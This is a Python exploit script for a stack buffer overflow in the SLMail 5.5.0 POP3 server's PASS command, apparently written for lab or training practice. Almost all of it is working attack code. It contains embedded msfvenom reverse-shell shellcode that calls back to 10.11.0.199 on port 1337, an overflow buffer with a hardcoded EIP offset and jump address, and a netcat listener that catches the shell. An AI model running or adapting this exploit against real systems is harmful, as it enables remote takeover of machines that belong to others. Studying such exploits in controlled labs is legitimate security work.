#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Software      = SLMail 5.5.0 Server                                                         #
# Download Link = http://downloads.informer.com/slmail/5.5/                                   #
# Reference     = https://www.exploit-db.com/exploits/638/                                    #
# Date          = 9/10/2017                                                                   #
# Author        = @ihack4falafel                                                              #
# Tested on     = Windows 7   - Professional SP1                                              #
#                 Windows XP  - Professional SP3                                              #
#                 Windows 8.1 - Enterprise                                                    #
# EIP Offset    = 2606                                                                        #
# Badchars      = "\x00\x0a"                                                                  #
# RET Address   = 0x5f4a358f : "\xFF\xE4" | [SLMFC.DLL]                                       #
# Usage         = python exploit.py <target IP>                                               #        
#---------------------------------------------------------------------------------------------#

import sys
import socket
import time
import struct
import subprocess


if len(sys.argv) < 2:
  print "Usage               : python exploit.py <target IP>"
  print "Example             : python exploit.py 10.11.0.100"
  sys.exit(0)

HOST = sys.argv[1]

  
#-------------------------------------------------------------------------------------------------------#
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.199 LPORT=1337 -b "\x00\x0a" -f python -v payload #
#-------------------------------------------------------------------------------------------------------#

payload =  ""
payload += "\xbd\x06\x1f\xed\xf1\xdd\xc6\xd9\x74\x24\xf4\x5a"
payload += "\x2b\xc9\xb1\x52\x31\x6a\x12\x03\x6a\x12\x83\xec"
payload += "\xe3\x0f\x04\x0c\xf3\x52\xe7\xec\x04\x33\x61\x09"
payload += "\x35\x73\x15\x5a\x66\x43\x5d\x0e\x8b\x28\x33\xba"
payload += "\x18\x5c\x9c\xcd\xa9\xeb\xfa\xe0\x2a\x47\x3e\x63"
payload += "\xa9\x9a\x13\x43\x90\x54\x66\x82\xd5\x89\x8b\xd6"
payload += "\x8e\xc6\x3e\xc6\xbb\x93\x82\x6d\xf7\x32\x83\x92"
payload += "\x40\x34\xa2\x05\xda\x6f\x64\xa4\x0f\x04\x2d\xbe"
payload += "\x4c\x21\xe7\x35\xa6\xdd\xf6\x9f\xf6\x1e\x54\xde"
payload += "\x36\xed\xa4\x27\xf0\x0e\xd3\x51\x02\xb2\xe4\xa6"
payload += "\x78\x68\x60\x3c\xda\xfb\xd2\x98\xda\x28\x84\x6b"
payload += "\xd0\x85\xc2\x33\xf5\x18\x06\x48\x01\x90\xa9\x9e"
payload += "\x83\xe2\x8d\x3a\xcf\xb1\xac\x1b\xb5\x14\xd0\x7b"
payload += "\x16\xc8\x74\xf0\xbb\x1d\x05\x5b\xd4\xd2\x24\x63"
payload += "\x24\x7d\x3e\x10\x16\x22\x94\xbe\x1a\xab\x32\x39"
payload += "\x5c\x86\x83\xd5\xa3\x29\xf4\xfc\x67\x7d\xa4\x96"
payload += "\x4e\xfe\x2f\x66\x6e\x2b\xff\x36\xc0\x84\x40\xe6"
payload += "\xa0\x74\x29\xec\x2e\xaa\x49\x0f\xe5\xc3\xe0\xea"
payload += "\x6e\xe6\xff\xf4\xa9\x9e\xfd\xf4\x30\x66\x8b\x12"
payload += "\x50\x88\xdd\x8d\xcd\x31\x44\x45\x6f\xbd\x52\x20"
payload += "\xaf\x35\x51\xd5\x7e\xbe\x1c\xc5\x17\x4e\x6b\xb7"
payload += "\xbe\x51\x41\xdf\x5d\xc3\x0e\x1f\x2b\xf8\x98\x48"
payload += "\x7c\xce\xd0\x1c\x90\x69\x4b\x02\x69\xef\xb4\x86"
payload += "\xb6\xcc\x3b\x07\x3a\x68\x18\x17\x82\x71\x24\x43"
payload += "\x5a\x24\xf2\x3d\x1c\x9e\xb4\x97\xf6\x4d\x1f\x7f"
payload += "\x8e\xbd\xa0\xf9\x8f\xeb\x56\xe5\x3e\x42\x2f\x1a"
payload += "\x8e\x02\xa7\x63\xf2\xb2\x48\xbe\xb6\xc3\x02\xe2"
payload += "\x9f\x4b\xcb\x77\xa2\x11\xec\xa2\xe1\x2f\x6f\x46"
payload += "\x9a\xcb\x6f\x23\x9f\x90\x37\xd8\xed\x89\xdd\xde"
payload += "\x42\xa9\xf7"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP               #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#


buffer =  "A" * 2606
buffer += struct.pack('<L', 0x5f4a358f)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (3500-2606-4-40-len(payload))

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  print "[+] Connected to SLMail 5.5.0 Server with an IP Address %s on port 110" %HOST
  time.sleep(2)
  s.connect((HOST,110))
  data = s.recv(1024)
  s.send('USER username' +'\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "[+] Sending %s bytes of evil payload..." %len(buffer)
  time.sleep(2)
  print "[+] Incoming shell <(^,^)>"
  subprocess.call(['nc -lnvp 1337'], shell=True)
except:
  print "Could not connect to SLMail 5.5.0 Server (._.)"


